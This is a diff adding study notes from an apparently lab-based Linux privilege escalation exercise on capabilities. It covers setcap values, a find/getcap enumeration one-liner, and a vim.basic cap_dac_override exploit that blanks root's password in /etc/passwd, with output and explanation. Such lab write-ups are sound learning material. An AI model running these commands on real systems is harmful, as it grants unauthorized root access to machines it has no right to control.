@@ -149,3 +149,89 @@ _**Use the privileged group rights of the secaudit user to locate a flag.**_
 <figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Went and found the /var/log file and looked at every adm group until i found one log file with the flag in it
+
+## Capabilities
+
+Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted
+
+we can use the `setcap` command to set capabilities for specific executables. This command allows us to specify the capability we want to set and the value we want to assign.
+
+Let's say we want to set the `cap_net_bind_service` capability for an executable
+
+```shell-session
+sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
+```
+
+When capabilities are set for a binary, it means that the binary will be able to perform specific actions that it would not be able to perform without the capabilities. For example, if the `cap_net_bind_service` capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted.
+
+Here are some interesting capabilities ->
+
+<table data-header-hidden><thead><tr><th width="253"></th><th></th></tr></thead><tbody><tr><td><strong>Capability</strong></td><td><strong>Description</strong></td></tr><tr><td><code>cap_sys_admin</code></td><td>Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.</td></tr><tr><td><code>cap_sys_chroot</code></td><td>Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.</td></tr><tr><td><code>cap_sys_ptrace</code></td><td>Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.</td></tr><tr><td><code>cap_sys_nice</code></td><td>Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.</td></tr><tr><td><code>cap_sys_time</code></td><td>Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.</td></tr><tr><td><code>cap_sys_resource</code></td><td>Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.</td></tr><tr><td><code>cap_sys_module</code></td><td>Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.</td></tr><tr><td><code>cap_net_bind_service</code></td><td>Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.</td></tr></tbody></table>
+
+When a binary is executed with capabilities, it can perform the actions that the capabilities allow.
+
+Here are some examples of values that we can use with the `setcap` command
+
+<table data-header-hidden><thead><tr><th width="126"></th><th></th></tr></thead><tbody><tr><td><strong>Capability Values</strong></td><td><strong>Description</strong></td></tr><tr><td><code>=</code></td><td>This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.</td></tr><tr><td><code>+ep</code></td><td>This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.</td></tr><tr><td><code>+ei</code></td><td>This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.</td></tr><tr><td><code>+p</code></td><td>This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.</td></tr></tbody></table>
+
+Here are some Linux capabilities that can be used to escalate a user's privileges to `root`
+
+<table data-header-hidden><thead><tr><th width="214"></th><th></th></tr></thead><tbody><tr><td><strong>Capability</strong></td><td><strong>Desciption</strong></td></tr><tr><td><code>cap_setuid</code></td><td>Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the <code>root</code> user.</td></tr><tr><td><code>cap_setgid</code></td><td>Allows to set its effective group ID, which can be used to gain the privileges of another group, including the <code>root</code> group.</td></tr><tr><td><code>cap_sys_admin</code></td><td>This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the <code>root</code> user, such as modifying system settings and mounting and unmounting file systems.</td></tr><tr><td><code>cap_dac_override</code></td><td>Allows bypassing of file read, write, and execute permission checks.</td></tr></tbody></table>
+
+If we want to try and use this, we need to suse this one liner to find all binary executables in the directories where they are typically located and then uses the `-exec` flag to run the `getcap` command on each, showing the capabilities that have been set for that binary.
+
+```shell-session
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+
+An example could be we get the following output ->
+
+```shell-session
+/usr/bin/vim.basic cap_dac_override=eip
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+```
+
+Now to exploit let's say the first one ->
+
+```shell-session
+ElFelixi0@htb[/htb]$ getcap /usr/bin/vim.basic
+
+/usr/bin/vim.basic cap_dac_override=eip
+```
+
+because the binary has the `cap_dac_override` capability set, it can escalate the privileges of the user who runs it.
+
+We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file
+
+```shell-session
+/usr/bin/vim.basic /etc/passwd
+```
+
+We also can make these changes in a non-interactive mode:
+
+```shell-session
+ElFelixi0@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+ElFelixi0@htb[/htb]$ cat /etc/passwd | head -n1
+
+root::0:0:root:/root:/bin/bash
+```
+
+&#x20;we can see that the `x` in that line is gone, which means that we can use the command `su` to log in as root without being asked for the password.
+
+* `:%s/^root:[^:]*:/root::/`:
+  * `:%s` is a substitution command in Vim that means "substitute in the whole file."
+  * `^root:[^:]*:` matches the line where the root user's password hash is stored in `/etc/passwd`. The pattern `[^:]*` matches anything between `root:` and the next colon (`:`), which represents the password hash field.
+  * `root::` replaces the password hash with nothing (i.e., it effectively deletes the password hash), leaving the root user without a password (i.e., no authentication required for root login).
+* `\nwq!`:
+  * &#x20;is a newline character, so Vim moves to the next command.
+  * `wq!` writes (saves) the changes to the file and quits Vim forcibly (`!` ensures that it happens without confirmation).
+* **`/usr/bin/vim.basic -es /etc/passwd`**:
+  * This part runs the command using Vim in "silent" and "ex mode" (`-es`):
+    * `-e`: Starts Vim in "ex mode," a streamlined version of Vim used for executing commands non-interactively (without opening the Vim editor UI).
+    * `-s`: Silent mode, which suppresses any output.
+  * The file being edited is `/etc/passwd`.
+
+_**Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer.**_
+
+<figure><img src="../../../.gitbook/assets/image (1475).png" alt=""><figcaption></figcaption></figure>
